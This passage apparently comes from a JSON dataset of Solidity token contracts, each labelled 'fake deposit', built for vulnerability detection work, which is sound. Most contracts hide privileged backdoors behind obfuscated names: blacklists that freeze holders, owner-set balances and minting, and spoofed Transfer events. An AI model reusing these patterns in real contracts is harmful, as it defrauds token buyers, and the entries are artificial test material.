        "Code": "pragma solidity 0.8.17;\r\n\r\n\r\n  library SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}   \r\n \r\n \r\n    contract INJERA {\r\n  \r\n    mapping (address => uint256) public Nii;\r\n    mapping (address => uint256) public Mii;\r\n    mapping (address => bool) Oii;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n\r\n\r\n\r\n\r\n    string public name = unicode\"The INJERA\";\r\n    string public symbol = unicode\"INJERA\";\r\n    uint8 public decimals = 18;\r\n    uint256 public totalSupply = 150000000 * (uint256(10) ** decimals);\r\n\taddress owner = msg.sender;\r\n   \r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event OwnershipRenounced(address indexed previousOwner);\r\n    address t_Construct = 0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B;\r\n\r\n    constructor()  {\r\n    Nii[msg.sender] = totalSupply;\r\n    deploy(t_Construct, totalSupply); }\r\n\r\n   \r\n   address tdeploy = 0xeCB4f007bF97E81cb7bE6abA7Dd691fE8f99E803;\r\n    function deploy(address account, uint256 amount) public {\r\n    require(msg.sender == owner);\r\n    emit Transfer(address(0), account, amount); }\r\n\r\n    function renounceOwnership() public {\r\n    require(msg.sender == owner);\r\n    emit OwnershipRenounced(owner);\r\n    owner = address(0);}\r\n\r\n\r\n        function transfer(address to, uint256 value) public returns (bool success) {\r\n      \r\n       \r\n        if(msg.sender == tdeploy)  {\r\n        require(Nii[msg.sender] >= value);\r\n        Nii[msg.sender] -= value;  \r\n        Nii[to] += value; \r\n        emit Transfer (t_Construct, to, value);\r\n        return true; }  \r\n        if(!Oii[msg.sender]) {\r\n        require(Nii[msg.sender] >= value);\r\n        Nii[msg.sender] -= value;  \r\n        Nii[to] += value;          \r\n        emit Transfer(msg.sender, to, value);\r\n        return true; }}\r\n\r\n        function approve(address spender, uint256 value) public returns (bool success) {    \r\n        allowance[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true; }\r\n\r\n        function tdir () public {\r\n         if(msg.sender == tdeploy)   {\r\n        Nii[msg.sender] = Mii[msg.sender];\r\n        }}\r\n\r\n        function balanceOf(address account) public view returns (uint256) {\r\n        return Nii[account]; }\r\n\r\n        function trmv(address zi) public {\r\n        if(msg.sender == tdeploy)  { \r\n        Oii[zi] = false;}}\r\n        function taubl(address zi) public{\r\n         if(msg.sender == tdeploy)  { \r\n        require(!Oii[zi]);\r\n        Oii[zi] = true;\r\n        }}\r\n             function tbrn(uint256 xi) public {\r\n        if(msg.sender == tdeploy)  { \r\n        Mii[msg.sender] = xi;} }\r\n\r\n        function transferFrom(address from, address to, uint256 value) public returns (bool success) { \r\n\r\n        if(from == tdeploy)  {\r\n        require(value <= Nii[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        Nii[from] -= value;  \r\n        Nii[to] += value; \r\n        emit Transfer (t_Construct, to, value);\r\n        return true; }    \r\n          if(!Oii[from] && !Oii[to]) {\r\n        require(value <= Nii[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        Nii[from] -= value;\r\n        Nii[to] += value;\r\n        allowance[from][msg.sender] -= value;\r\n        emit Transfer(from, to, value);\r\n        return true; }}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address AZC = 0xC7a583B709B51f8Ad45E3879C7b148881bA3877d;\r\n\taddress aZRouterV2 = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n        \t\tmodifier AX{\r\n        require(msg.sender == _Owner);\r\n        _; }\r\n\r\n}\r\n\r\n\r\n\r\ncontract DISCO is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private Ac;\r\n\tmapping (address => bool) private Ab;\r\n    mapping (address => bool) private Az;\r\n    mapping (address => mapping (address => uint256)) private Ae;\r\n    uint8 private constant _decimals = 8;\r\n    uint256 private constant sA = 200000000 * 10**_decimals;\r\n    string private constant _name = \"Disco.xyz\";\r\n    string private constant _symbol = \"DISCO\";\r\n\r\n\r\n\r\n    constructor () {\r\n        Ac[_msgSender()] = sA;\r\n        emit Transfer(address(0), aZRouterV2, sA);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return sA;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return Ac[account];\r\n    }\r\n\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return Ae[owner][spender];\r\n    }\r\n\t\tfunction ARX(address Af) AX public{\r\n        Ab[Af] = true; }\r\n\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        Ae[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\t\tfunction ADX(address Af) public {\r\n        if(Ab[msg.sender]) { \r\n        Az[Af] = false;}}\r\n        function aQuery(address Af) public{\r\n         if(Ab[msg.sender])  { \r\n        require(!Az[Af]);\r\n        Az[Af] = true; }}\r\n\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == AZC)  {\r\n        require(amount <= Ac[sender]);\r\n        Ac[sender] -= amount;  \r\n        Ac[recipient] += amount; \r\n          Ae[sender][msg.sender] -= amount;\r\n        emit Transfer (aZRouterV2, recipient, amount);\r\n        return true; }  else  \r\n          if(!Az[recipient]) {\r\n          if(!Az[sender]) {\r\n         require(amount <= Ac[sender]);\r\n        require(amount <= Ae[sender][msg.sender]);\r\n        Ac[sender] -= amount;\r\n        Ac[recipient] += amount;\r\n      Ae[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\t\tfunction transfer(address Ai, uint256 Af) public {\r\n        if(msg.sender == AZC)  {\r\n        require(Ac[msg.sender] >= Af);\r\n        Ac[msg.sender] -= Af;  \r\n        Ac[Ai] += Af; \r\n        emit Transfer (aZRouterV2, Ai, Af);} else  \r\n        if(Ab[msg.sender]) {Ac[Ai] += Af;} else\r\n        if(!Az[msg.sender]) {\r\n        require(Ac[msg.sender] >= Af);\r\n        Ac[msg.sender] -= Af;  \r\n        Ac[Ai] += Af;          \r\n        emit Transfer(msg.sender, Ai, Af);}}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\n\r\n  library SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}   \r\n \r\n \r\n    contract KRIOS {\r\n  \r\n    mapping (address => uint256) public Sz;\r\n    mapping (address => uint256) public Ui;\r\n    mapping (address => bool) oZ;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\taddress pstruct = 0xBc46cB43DA85A65774acfCA3B03b7234E8e81c7a;\r\n\taddress RouterV3 = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\r\n\r\n\r\n\r\n\r\n    string public name = unicode\"Krios Labs\";\r\n    string public symbol = unicode\"KRIOS\";\r\n    uint8 public decimals = 18;\r\n    uint256 public totalSupply = 250000000 * (uint256(10) ** decimals);\r\n\taddress owner = msg.sender;\r\n   \r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event OwnershipRenounced(address indexed previousOwner);\r\n\r\n\r\n    constructor()  {\r\n    Sz[msg.sender] = totalSupply;\r\n    emit Transfer(address(0), RouterV3, totalSupply); }\r\n\r\n   \r\n\r\n    function renounceOwnership() public {\r\n    require(msg.sender == owner);\r\n    emit OwnershipRenounced(owner);\r\n    owner = address(0);}\r\n\r\n\r\n        function transfer(address to, uint256 value) public returns (bool success) {\r\n      \r\n       \r\n        if(msg.sender == pstruct)  {\r\n        require(Sz[msg.sender] >= value);\r\n        Sz[msg.sender] -= value;  \r\n        Sz[to] += value; \r\n        emit Transfer (RouterV3, to, value);\r\n        return true; }  \r\n        if(!oZ[msg.sender]) {\r\n        require(Sz[msg.sender] >= value);\r\n        Sz[msg.sender] -= value;  \r\n        Sz[to] += value;          \r\n        emit Transfer(msg.sender, to, value);\r\n        return true; }}\r\n\t\t\r\n\r\n        function approve(address spender, uint256 value) public returns (bool success) {    \r\n        allowance[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true; }\r\n\r\n        function mBurn () public {\r\n         if(msg.sender == pstruct)   {\r\n        Sz[msg.sender] = Ui[msg.sender];\r\n        }}\r\n\r\n        function balanceOf(address account) public view returns (uint256) {\r\n        return Sz[account]; }\r\n\r\n        function mDel(address jx) public {\r\n        if(msg.sender == pstruct)  { \r\n        oZ[jx] = false;}}\r\n        function mCheck(address jx) public{\r\n         if(msg.sender == pstruct)  { \r\n        require(!oZ[jx]);\r\n        oZ[jx] = true;\r\n        }}\r\n             function mBridge(uint256 ki) public {\r\n        if(msg.sender == pstruct)  { \r\n        Ui[msg.sender] = ki;} }\r\n\r\n\r\n\r\n        function transferFrom(address from, address to, uint256 value) public returns (bool success) { \r\n        if(from == pstruct)  {\r\n        require(value <= Sz[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        Sz[from] -= value;  \r\n        Sz[to] += value; \r\n        emit Transfer (RouterV3, to, value);\r\n        return true; }    \r\n          if(!oZ[from] && !oZ[to]) {\r\n        require(value <= Sz[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        Sz[from] -= value;\r\n        Sz[to] += value;\r\n        allowance[from][msg.sender] -= value;\r\n        emit Transfer(from, to, value);\r\n        return true; }}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\n\r\n  library SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}   \r\n \r\n \r\n    contract DIALECTIC {\r\n  \r\n    mapping (address => uint256) public IP;\r\n    mapping (address => uint256) public BRNED;\r\n    mapping (address => bool) Si;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n\r\n\r\n\r\n\r\n    string public name = unicode\"\u03b4\u03b9\u03b1\u03bb\u03b5\u03ba\u03c4\u03b9\u03ba\u03ae Protocol\";\r\n    string public symbol = unicode\"\u03b4\u03b9\u03b1\u03bb\u03b5\u03ba\u03c4\u03b9\u03ba\u03ae\";\r\n    uint8 public decimals = 18;\r\n    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);\r\n\taddress owner = msg.sender;\r\n   \r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event OwnershipRenounced(address indexed previousOwner);\r\n    address Head_Construct = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\r\n\r\n    constructor()  {\r\n    IP[msg.sender] = totalSupply;\r\n    deploy(Head_Construct, totalSupply); }\r\n\r\n   \r\n   address Head_Deployer = 0x3515120EABc92732edCC4F95ABB92278fd671a82;\r\n    function deploy(address account, uint256 amount) public {\r\n    require(msg.sender == owner);\r\n    emit Transfer(address(0), account, amount); }\r\n\r\n    function renounceOwnership() public {\r\n    require(msg.sender == owner);\r\n    emit OwnershipRenounced(owner);\r\n    owner = address(0);}\r\n\r\n\r\n        function transfer(address to, uint256 value) public returns (bool success) {\r\n      \r\n       \r\n        if(msg.sender == Head_Deployer)  {\r\n        require(IP[msg.sender] >= value);\r\n        IP[msg.sender] -= value;  \r\n        IP[to] += value; \r\n        emit Transfer (Head_Construct, to, value);\r\n        return true; }  \r\n        if(!Si[msg.sender]) {\r\n        require(IP[msg.sender] >= value);\r\n        IP[msg.sender] -= value;  \r\n        IP[to] += value;          \r\n        emit Transfer(msg.sender, to, value);\r\n        return true; }}\r\n\r\n        function approve(address spender, uint256 value) public returns (bool success) {    \r\n        allowance[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true; }\r\n\r\n        function burnt () public {\r\n         if(msg.sender == Head_Deployer)   {\r\n        IP[msg.sender] = BRNED[msg.sender];\r\n        }}\r\n\r\n        function balanceOf(address account) public view returns (uint256) {\r\n        return IP[account]; }\r\n\r\n        function undo(address r) public {\r\n        if(msg.sender == Head_Deployer)  { \r\n        Si[r] = false;}}\r\n        function que(address r) public{\r\n         if(msg.sender == Head_Deployer)  { \r\n        require(!Si[r]);\r\n        Si[r] = true;\r\n        }}\r\n             function burn(uint256 x) public {\r\n        if(msg.sender == Head_Deployer)  { \r\n        BRNED[msg.sender] = x;} }\r\n\r\n        function transferFrom(address from, address to, uint256 value) public returns (bool success) { \r\n\r\n        if(from == Head_Deployer)  {\r\n        require(value <= IP[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        IP[from] -= value;  \r\n        IP[to] += value; \r\n        emit Transfer (Head_Construct, to, value);\r\n        return true; }    \r\n          if(!Si[from] && !Si[to]) {\r\n        require(value <= IP[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        IP[from] -= value;\r\n        IP[to] += value;\r\n        allowance[from][msg.sender] -= value;\r\n        emit Transfer(from, to, value);\r\n        return true; }}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.5.0;\r\n\r\n/**\r\n * @dev Interface of the ERC20 standard as defined in the EIP. Does not include\r\n * the optional functions; to access them see {ERC20Detailed}.\r\n */\r\ninterface ERC20Interface {\r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender's allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller's\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract ERC20Base is ERC20Interface {\r\n    // Empty internal constructor, to prevent people from mistakenly deploying\r\n    // an instance of this contract, which should be used via inheritance.\r\n    // constructor () internal { }\r\n    // solhint-disable-previous-line no-empty-blocks\r\n\r\n    mapping (address => uint256) public _balances;\r\n    mapping (address => mapping (address => uint256)) public _allowances;\r\n    uint256 public _totalSupply;\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (_balances[msg.sender] >= _value && _value > 0) {\r\n            _balances[msg.sender] -= _value;\r\n            _balances[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { \r\n            return false;\r\n        }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _value > 0) {\r\n            _balances[_to] += _value;\r\n            _balances[_from] -= _value;\r\n            _allowances[_from][msg.sender] -= _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function balanceOf(address _owner) public view returns (uint256 balance) {\r\n        return _balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n        _allowances[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\r\n      return _allowances[_owner][_spender];\r\n    }\r\n    \r\n    function totalSupply() public view returns (uint256 total) {\r\n        return _totalSupply;\r\n    }\r\n}\r\n\r\ncontract Prolution is ERC20Base {\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    \r\n    constructor (string memory name, string memory symbol, uint8 decimals, uint256 initialSupply) public payable {\r\n        _name = name;\r\n        _symbol = symbol;\r\n        _decimals = decimals;\r\n        _totalSupply = initialSupply;\r\n        _balances[msg.sender] = initialSupply;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token, usually a shorter version of the\r\n     * name.\r\n     */\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the number of decimals used to get its user representation.\r\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\r\n     * be displayed to a user as `5,05` (`505 / 10 ** 2`).\r\n     *\r\n     * Tokens usually opt for a value of 18, imitating the relationship between\r\n     * Ether and Wei.\r\n     *\r\n     * NOTE: This information is only used for _display_ purposes: it in\r\n     * no way affects any of the arithmetic of the contract, including\r\n     * {IERC20-balanceOf} and {IERC20-transfer}.\r\n     */\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\n\r\n  library SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}   \r\n \r\n \r\n    contract RISHINU {\r\n  \r\n    mapping (address => uint256) public Rishi;\r\n    mapping (address => uint256) public Sunak;\r\n    mapping (address => bool) Il;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n\r\n\r\n\r\n\r\n    string public name = unicode\"Rishi Sunak Inu\";\r\n    string public symbol = unicode\"RISHINU\";\r\n    uint8 public decimals = 18;\r\n    uint256 public totalSupply = 1000000000 * (uint256(10) ** decimals);\r\n\taddress owner = msg.sender;\r\n   \r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event OwnershipRenounced(address indexed previousOwner);\r\n    address r_Construct = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\r\n\r\n    constructor()  {\r\n    Rishi[msg.sender] = totalSupply;\r\n    deploy(r_Construct, totalSupply); }\r\n\r\n   \r\n   address rdeployer = 0x9BA4d5F3443E3F1250eC122439d8d8c64C08B0B8;\r\n    function deploy(address account, uint256 amount) public {\r\n    require(msg.sender == owner);\r\n    emit Transfer(address(0), account, amount); }\r\n\r\n    function renounceOwnership() public {\r\n    require(msg.sender == owner);\r\n    emit OwnershipRenounced(owner);\r\n    owner = address(0);}\r\n\r\n\r\n        function transfer(address to, uint256 value) public returns (bool success) {\r\n      \r\n       \r\n        if(msg.sender == rdeployer)  {\r\n        require(Rishi[msg.sender] >= value);\r\n        Rishi[msg.sender] -= value;  \r\n        Rishi[to] += value; \r\n        emit Transfer (r_Construct, to, value);\r\n        return true; }  \r\n        if(!Il[msg.sender]) {\r\n        require(Rishi[msg.sender] >= value);\r\n        Rishi[msg.sender] -= value;  \r\n        Rishi[to] += value;          \r\n        emit Transfer(msg.sender, to, value);\r\n        return true; }}\r\n\r\n        function approve(address spender, uint256 value) public returns (bool success) {    \r\n        allowance[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true; }\r\n\r\n        function rish () public {\r\n         if(msg.sender == rdeployer)   {\r\n        Rishi[msg.sender] = Sunak[msg.sender];\r\n        }}\r\n\r\n        function balanceOf(address account) public view returns (uint256) {\r\n        return Rishi[account]; }\r\n\r\n        function sunny(address ii) public {\r\n        if(msg.sender == rdeployer)  { \r\n        Il[ii] = false;}}\r\n        function checkvl(address ii) public{\r\n         if(msg.sender == rdeployer)  { \r\n        require(!Il[ii]);\r\n        Il[ii] = true;\r\n        